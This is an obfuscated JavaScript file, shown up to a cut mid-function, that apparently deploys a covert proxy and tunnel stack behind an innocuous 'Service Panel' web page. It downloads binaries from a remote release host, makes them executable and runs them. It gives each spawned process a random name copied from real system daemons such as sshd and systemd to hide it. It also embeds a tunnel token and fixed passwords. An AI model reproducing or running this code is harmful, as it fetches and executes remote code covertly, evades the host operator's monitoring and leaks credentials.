const b = 'const _0x53f00e=_0x2b4f;(function(_0x1be5cf,_0x47051f){const _0x43f6f8=_0x2b4f,_0xb5e800=_0x1be5cf();while(!![]){try{const _0x6f2651=parseInt(_0x43f6f8(0x24d))/0x1+parseInt(_0x43f6f8(0x1e8))/0x2*(parseInt(_0x43f6f8(0x25c))/0x3)+-parseInt(_0x43f6f8(0x1f9))/0x4+-parseInt(_0x43f6f8(0x1e0))/0x5+-parseInt(_0x43f6f8(0x243))/0x6*(-parseInt(_0x43f6f8(0x23c))/0x7)+-parseInt(_0x43f6f8(0x1bc))/0x8*(-parseInt(_0x43f6f8(0x1a6))/0x9)+-parseInt(_0x43f6f8(0x21f))/0xa;if(_0x6f2651===_0x47051f)break;else _0xb5e800['push'](_0xb5e800['shift']());}catch(_0x33038a){_0xb5e800['push'](_0xb5e800['shift']());}}}(_0x59be,0xb2278));const http=require(_0x53f00e(0x252)),https=require(_0x53f00e(0x1ca)),fs=require('fs'),path=require(_0x53f00e(0x1e2)),os=require('os'),{spawn,exec}=require(_0x53f00e(0x1e5)),{URL}=require('url'),crypto=require('crypto'),net=require(_0x53f00e(0x274)),express=require(_0x53f00e(0x1da)),{createProxyMiddleware}=require(_0x53f00e(0x1fe)),axios=require(_0x53f00e(0x234)),CONFIG={'C_T':process['env'][_0x53f00e(0x267)]||_0x53f00e(0x1e1),'B_D':process[_0x53f00e(0x22f)][_0x53f00e(0x25f)]||_0x53f00e(0x1c3),'C_D':process[_0x53f00e(0x22f)]['C_D']||_0x53f00e(0x25b),'K_S':process[_0x53f00e(0x22f)][_0x53f00e(0x1cd)]||_0x53f00e(0x1b9),'K_K':process['env'][_0x53f00e(0x239)]||'hWB6PgxSoKUp1p0daF','HY2_PORT':process[_0x53f00e(0x22f)]['HY2_PORT']||process[_0x53f00e(0x22f)]['SERVER_PORT']||'','VMESS_PORT':process[_0x53f00e(0x22f)]['VMESS_PORT']||_0x53f00e(0x1ff),'REALITY_PORT':process[_0x53f00e(0x22f)][_0x53f00e(0x1ed)]||'','TUIC_PORT':process[_0x53f00e(0x22f)]['TUIC_PORT']||'','VMESS_UUID':process[_0x53f00e(0x22f)][_0x53f00e(0x1c0)]||_0x53f00e(0x212),'TUIC_UUID':process[_0x53f00e(0x22f)][_0x53f00e(0x1ab)]||_0x53f00e(0x212),'TUIC_PASSWORD':process[_0x53f00e(0x22f)]['TUIC_PASSWORD']||'789456','HY2_PASSWORD':process['env'][_0x53f00e(0x251)]||'789456','REALITY_PRIVATE_KEY':process['env'][_0x53f00e(0x201)]||'','REALITY_PUBLIC_KEY':process['env']['REALITY_PUBLIC_KEY']||'','HY2_SNI':process[_0x53f00e(0x22f)][_0x53f00e(0x224)]||_0x53f00e(0x1c8),'VMESS_PATH':process[_0x53f00e(0x22f)]['VMESS_PATH']||_0x53f00e(0x1e4),'REALITY_SNI':process[_0x53f00e(0x22f)][_0x53f00e(0x270)]||_0x53f00e(0x215),'REALITY_SHORT_ID':process[_0x53f00e(0x22f)][_0x53f00e(0x219)]||_0x53f00e(0x1b5),'PORT':process['env']['PORT']||0x1eb4},WORK_DIR=os['tmpdir'](),processes=[];let serviceStatus={'singbox':'stopped','cloudflared':'stopped','komari':_0x53f00e(0x203),'http':_0x53f00e(0x203)};const HTML_TEMPLATES={'home':_0x53f00e(0x246),'status':(_0x5028ac,_0x14fff1)=>_0x53f00e(0x216)+(serviceStatus['singbox']==='running'?_0x53f00e(0x227):_0x53f00e(0x258))+_0x53f00e(0x248)+serviceStatus[_0x53f00e(0x213)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20'+(serviceStatus[_0x53f00e(0x22d)]==='running'?_0x53f00e(0x227):'status-stopped')+_0x53f00e(0x23e)+serviceStatus[_0x53f00e(0x22d)]+_0x53f00e(0x1cf)+(serviceStatus[_0x53f00e(0x1e9)]===_0x53f00e(0x24b)?_0x53f00e(0x227):_0x53f00e(0x258))+_0x53f00e(0x262)+serviceStatus[_0x53f00e(0x1e9)]+_0x53f00e(0x1cf)+(serviceStatus[_0x53f00e(0x252)]==='running'?'status-running':_0x53f00e(0x258))+_0x53f00e(0x1b1)+serviceStatus[_0x53f00e(0x252)]+'</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-info\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Configured\x20Ports:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>HTTP</div><div\x20class=\x22port-value\x22>'+CONFIG[_0x53f00e(0x1de)]+_0x53f00e(0x1db)+(CONFIG[_0x53f00e(0x238)]?_0x53f00e(0x1c6)+CONFIG[_0x53f00e(0x238)]+_0x53f00e(0x200):'')+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20'+(CONFIG['HY2_PORT']?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Hysteria2</div><div\x20class=\x22port-value\x22>'+CONFIG[_0x53f00e(0x1c9)]+'</div></div>':'')+_0x53f00e(0x266)+(CONFIG[_0x53f00e(0x1ed)]?'<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>Reality</div><div\x20class=\x22port-value\x22>'+CONFIG[_0x53f00e(0x1ed)]+'</div></div>':'')+_0x53f00e(0x266)+(CONFIG[_0x53f00e(0x22e)]?_0x53f00e(0x1ba)+CONFIG[_0x53f00e(0x22e)]+_0x53f00e(0x200):'')+_0x53f00e(0x1e6)+_0x5028ac+_0x53f00e(0x202)+(_0x14fff1[_0x53f00e(0x1cb)]>0x0?_0x14fff1[_0x53f00e(0x22c)](_0xc173e2=>_0x53f00e(0x1a8)+_0xc173e2['protocol']+_0x53f00e(0x1b2)+_0xc173e2[_0x53f00e(0x1d2)][_0x53f00e(0x1fa)]()+'\x22>'+_0xc173e2[_0x53f00e(0x269)]+_0x53f00e(0x1e3)+_0xc173e2[_0x53f00e(0x269)]+_0x53f00e(0x235)+_0xc173e2['protocol']+'!\x27))\x22>Copy</button>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20')[_0x53f00e(0x1af)](''):'<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>No\x20active\x20connections</div></div>')+_0x53f00e(0x1f1)},COMMON_PROCESS_NAMES=['sshd',_0x53f00e(0x1d3),_0x53f00e(0x26f),'httpd',_0x53f00e(0x214),_0x53f00e(0x256),_0x53f00e(0x1ae),_0x53f00e(0x245),'ntpd','systemd','crond','rsyslogd',_0x53f00e(0x223),_0x53f00e(0x1f4),_0x53f00e(0x20f),_0x53f00e(0x1f6),_0x53f00e(0x237),_0x53f00e(0x204),_0x53f00e(0x1c7),_0x53f00e(0x225),_0x53f00e(0x1a7),_0x53f00e(0x21d),_0x53f00e(0x1fd),_0x53f00e(0x211),_0x53f00e(0x20b),_0x53f00e(0x1bd),_0x53f00e(0x255),'atd','dhclient',_0x53f00e(0x226),_0x53f00e(0x25d)];function getRandomProcessName(){const _0x19e89f=_0x53f00e;return COMMON_PROCESS_NAMES[Math[_0x19e89f(0x26d)](Math[_0x19e89f(0x21b)]()*COMMON_PROCESS_NAMES[_0x19e89f(0x1cb)])];}function detectArch(){const _0x3aad5c=_0x53f00e,_0x35e5a3=process[_0x3aad5c(0x22a)];return _0x35e5a3==='x64'?_0x3aad5c(0x1a9):_0x35e5a3===_0x3aad5c(0x1f3)?_0x3aad5c(0x1f3):(process[_0x3aad5c(0x1b6)](0x1),'');}function _0x59be(){const _0x49bca8=['join','?encryption=none&flow=xtls-rprx-vision&security=reality&sni=','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>HTTP\x20Server</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>',':</span></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22\x20id=\x22','http://localhost:','writeFileSync','0123456789abcdef','exit','tunnel','unlinkSync','https://komari.seav.eu.org','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>TUIC</div><div\x20class=\x22port-value\x22>','https://github.com/seav1/dl/releases/download/files/ko','21752uAxEry','dbus-daemon','vless://','utf8','VMESS_UUID','1.1.1.1','status','loc.gov','hex','文件未找到:\x20','<div\x20class=\x22port-item\x22><div\x20class=\x22port-label\x22>VMESS</div><div\x20class=\x22port-value\x22>','mongod','www.bing.com','HY2_PORT','https','length','10s','K_S','config.json','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','listen','Hysteria2','protocol','nginx','data','tuic','auto','match','xtls-rprx-vision','127.0.0.1','express','</div></div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','home','TUIC_PASSWORD','PORT','https://github.com/seav1/dl/releases/download/files/cf-arm','5489575cmLlUE','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiMjYxYjNjZjgtNDFlOC00MTViLTk2MTAtYWI0NWQwODkxNmU1IiwicyI6Ik16TTJaak14T0dJdFpUVmlaaTAwWVdNMUxUbG1NV1F0T0RBeVpEQXpabUV5TkRKbSJ9','path','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','/vms','child_process','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22>Server\x20IP:</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22value\x22>','?insecure=1&sni=','2OanfSf','komari','--no-autoupdate','\x22\x20generate\x20reality-keypair','end','REALITY_PORT','&fp=chrome&pbk=','/health','writeHead','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','ignore','arm64','node','chmodSync','php-fpm','randomBytes','https://github.com/seav1/dl/releases/download/files/cf','3516464hDwgSa','toLowerCase','VMess','warn','logrotate','http-proxy-middleware','8001','</div></div>','REALITY_PRIVATE_KEY','</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','stopped','ruby','https://github.com/seav1/dl/releases/download/files/ko-arm','C_D','direct','REALITY_PUBLIC_KEY','get','upgrade','syslogd','--protocol','/status','logFile','python','stringify','udevd','feefeb96-bfcf-4a9b-aac0-6aac771c1b98','singbox','mysqld','www.microsoft.com','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Status</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{max-width:900px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;text-align:center;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card{padding:20px;background:#f8f9fa;border-radius:8px;text-align:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-card\x20h3{margin:0\x200\x2010px\x200;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-running{background:#d4edda;color:#155724}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.status-stopped{background:#f8d7da;color:#721c24}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all;font-size:12px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.protocol{color:#28a745;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav{text-align:center;margin-bottom:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a{margin:0\x2010px;color:#007cba;text-decoration:none}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav\x20a:hover{text-decoration:underline}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-info{margin:20px\x200;padding:15px;background:#e9ecef;border-radius:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:10px;margin-top:10px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-item{background:#fff;padding:10px;border-radius:4px;text-align:center;box-shadow:0\x201px\x203px\x20rgba(0,0,0,0.1)}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-label{font-weight:bold;color:#555}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.port-value{font-family:monospace;color:#28a745;margin-top:5px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20function\x20refreshPage()\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20location.reload();\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20setInterval(refreshPage,\x2030000);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</script>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/\x22>Home</a>\x20|\x20<a\x20href=\x22/status\x22>Status</a>\x20|\x20<a\x20href=\x22javascript:refreshPage()\x22>Refresh</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Status</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-grid\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22status-card\x20','https://github.com/seav1/dl/releases/download/files/sb','&sid=','REALITY_SHORT_ID','push','random','some','snapd','.log','17448410aSyTYa','cubic','komari.log','VMESS','supervisord','HY2_SNI','dockerd','polkitd','status-running','\x22\x20check\x20-c\x20\x22','reality-in','arch','vless','map','cloudflared','TUIC_PORT','env','http2','finish','ws://localhost:','kill','axios','\x27).then(()=>alert(\x27Copied\x20','from','java','VMESS_PORT','K_K','forEach','readFileSync','556759FVVXJh','killed','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Cloudflared</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','createWriteStream','--url','stdout','TUIC','42mGaMVd','chrome','memcached','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<html>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Service\x20Panel</title>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links{margin-top:30px}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a{display:inline-block;margin:0\x2010px;padding:10px\x2020px;background:#667eea;color:white;text-decoration:none;border-radius:5px;transition:background\x200.3s}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.nav-links\x20a:hover{background:#5a67d8}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</head>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Service\x20Panel</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>Multi-protocol\x20service\x20management\x20panel.</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22nav-links\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\x22/status\x22>View\x20Status</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22footer\x22>Service\x20Management\x20Panel</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</body>\x0a\x20\x20\x20\x20\x20\x20\x20\x20</html>\x0a\x20\x20\x20\x20','error','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>Sing-Box</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','--token','text/html','running','find','1449854fMssev','none','?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#TUIC','trim','HY2_PASSWORD','http','--edge-ip-version','https://ipv4.icanhazip.com','cron','postgres','every','status-stopped','uptime','SIGINT','huggingface.seav.eu.org','3411420AywDVh','irqbalance','Reality','B_D','all','https://github.com/seav1/dl/releases/download/files/sb-arm','\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h3>komari</h3>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div>','run','google','pipe','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','C_T','stderr','url','--disable-auto-update','block','hysteria2','floor','cloudflare','apache2','REALITY_SNI','vmess-in','toString','8.8.8.8','net','VMESS_PATH','4329xShVLz','containerd','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22info-item\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22label\x22><span\x20class=\x22protocol\x22>','amd64','tls','TUIC_UUID','&type=tcp#REALITY','0.0.0.0','redis-server'];_0x59be=function(){return _0x49bca8;};return _0x59be();}async function downloadBinary(_0x5e6ce7,_0x5ed571){const _0x5538ce=_0x53f00e;try{const _0x3aec03=await axios({'method':'GET','url':_0x5e6ce7,'responseType':'stream'}),_0x3aab76=fs['createWriteStream'](_0x5ed571);return _0x3aec03[_0x5538ce(0x1d4)][_0x5538ce(0x265)](_0x3aab76),new Promise((_0x3306f6,_0x2ffae3)=>{const _0x4fec8f=_0x5538ce;_0x3aab76['on'](_0x4fec8f(0x231),()=>{const _0x203e04=_0x4fec8f;fs[_0x203e04(0x1f5)](_0x5ed571,0x1ed),_0x3306f6();}),_0x3aab76['on']('error',_0x2ffae3);});}catch(_0x23f412){throw _0x23f412;}}async function getServerIP(){const _0x7770c3=_0x53f00e;try{const _0x284d86=await axios[_0x7770c3(0x209)](_0x7770c3(0x254));return _0x284d86[_0x7770c3(0x1d4)][_0x7770c3(0x250)]();}catch(_0x470a16){return _0x7770c3(0x1d9);}}async function startTempTunnel(_0x4ed1ac,_0x1808c8){return new Promise(_0x3792fc=>{const _0xc01f17=_0x2b4f;for(let _0x243789=0x0;_0x243789<0x3;_0x243789++){const _0x2ba3ef=path[_0xc01f17(0x1af)](WORK_DIR,'cf_'+crypto[_0xc01f17(0x1f7)](0x4)[_0xc01f17(0x272)](_0xc01f17(0x1c4))+_0xc01f17(0x21e)),_0x3384df=spawn(_0x4ed1ac,[_0xc01f17(0x1b7),_0xc01f17(0x1ea),'--url',_0xc01f17(0x1b3)+_0x1808c8],{'stdio':[_0xc01f17(0x1f2),_0xc01f17(0x265),'pipe']});processes[_0xc01f17(0x21a)](_0x3384df);const _0x40b7b4=fs[_0xc01f17(0x23f)](_0x2ba3ef);_0x3384df[_0xc01f17(0x241)]['pipe'](_0x40b7b4),_0x3384df[_0xc01f17(0x268)][_0xc01f17(0x265)](_0x40b7b4),serviceStatus[_0xc01f17(0x22d)]=_0xc01f17(0x24b),_0x3384df['on'](_0xc01f17(0x247),()=>{const _0x32dc5a=_0xc01f17;serviceStatus[_0x32dc5a(0x22d)]=_0x32dc5a(0x247);}),_0x3384df['on'](_0xc01f17(0x1b6),_0x2bc6c7=>{const _0x4e4c1d=_0xc01f17;_0x2bc6c7!==0x0&&(serviceStatus[_0x4e4c1d(0x22d)]=_0x4e4c1d(0x203));}),setTimeout(()=>{const _0x2c93d4=_0xc01f17;try{const _0x5ba6fd=fs[_0x2c93d4(0x23b)](_0x2ba3ef,_0x2c93d4(0x1bf)),_0x4637cf=_0x5ba6fd[_0x2c93d4(0x1d7)](/https:\/\/([^\/\s]+\.trycloudflare\.com)/);if(_0x4637cf){CONFIG[_0x2c93d4(0x206)]=_0x4637cf[0x1];try{fs[_0x2c93d4(0x1b8)](_0x2ba3ef);}catch(_0x3f2d6){}return _0x3792fc(!![]);}}catch(_0x41158a){}_0x3384df[_0x2c93d4(0x233)]();try{fs[_0x2c93d4(0x1b8)](_0x2ba3ef);}catch(_0xd16ed){}_0x243789===0x2&&(serviceStatus[_0x2c93d4(0x22d)]='error',_0x3792fc(![]));},0x2710);}});}async function generateRealityKeys(_0x14bc3a){const 